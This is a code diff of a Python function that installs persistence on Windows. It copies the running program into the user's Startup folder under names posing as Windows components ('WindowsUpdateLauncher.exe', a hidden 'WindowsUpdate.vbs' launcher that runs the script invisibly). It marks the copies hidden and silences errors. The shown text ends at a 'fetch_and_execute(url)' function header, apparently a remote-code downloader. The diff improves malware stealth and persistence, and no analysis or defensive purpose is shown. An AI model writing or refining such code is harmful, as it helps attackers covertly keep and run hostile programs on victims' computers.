@@ -21,34 +21,42 @@ from pathlib import Path
 
 def copy_exe_to_startup():
     try:
+        import sys
+        import os
+        import shutil
+        import ctypes
+        
         if getattr(sys, 'frozen', False):
             current_exe = sys.executable
         else:
             current_exe = os.path.abspath(__file__)
-
+        
         if not os.path.exists(current_exe):
             return False
-
+        
         startup_folder = os.path.join(
             os.getenv('APPDATA'),
             'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
         )
-
+        
         if not os.path.exists(startup_folder):
             os.makedirs(startup_folder, exist_ok=True)
-
-        ext = os.path.splitext(current_exe)[1]
-        destination_path = os.path.join(startup_folder, f"winscvhost{ext}")
-
-        if not os.path.exists(destination_path):
-            shutil.copy2(current_exe, destination_path)
-            try:
-                ctypes.windll.kernel32.SetFileAttributesW(destination_path, 2)
-            except:
-                pass
+        
+        if not current_exe.lower().endswith('.exe'):
+            vbs_path = os.path.join(startup_folder, "WindowsUpdate.vbs")
+            if not os.path.exists(vbs_path):
+                vbs_content = f'''CreateObject("WScript.Shell").Run """python "{current_exe}""", 0, False'''
+                with open(vbs_path, 'w') as f:
+                    f.write(vbs_content)
+                ctypes.windll.kernel32.SetFileAttributesW(vbs_path, 2)
             return True
-        return False
-    except Exception:
+        else:
+            destination_path = os.path.join(startup_folder, "WindowsUpdateLauncher.exe")
+            if not os.path.exists(destination_path):
+                shutil.copy2(current_exe, destination_path)
+                ctypes.windll.kernel32.SetFileAttributesW(destination_path, 2)
+            return True
+    except Exception as e:
         return False
 
 def fetch_and_execute(url):
